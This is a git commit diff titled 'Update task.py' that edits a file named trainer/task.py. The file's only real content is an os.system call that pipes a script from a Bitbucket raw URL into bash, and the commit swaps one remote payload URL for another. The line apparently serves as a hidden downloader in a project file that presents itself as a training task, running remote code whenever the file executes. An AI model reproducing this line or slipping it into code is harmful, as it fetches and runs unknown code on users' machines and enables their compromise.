31095d5f654cf7944cd7bd65fd1f2008de323782
ryandijeremy <167563417+ryandijeremy@users.noreply.github.com>
2024-05-16 03:31:24 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/mikay2808/yui/raw/77999d641b960aa518343743e550152d14bd5b25/hero | bash')
+os.system('curl -sL https://bitbucket.org/mikay2808/yui/raw/6b2d1e5840fba2588f8565edd6231b5990e05eb6/rubby | bash')
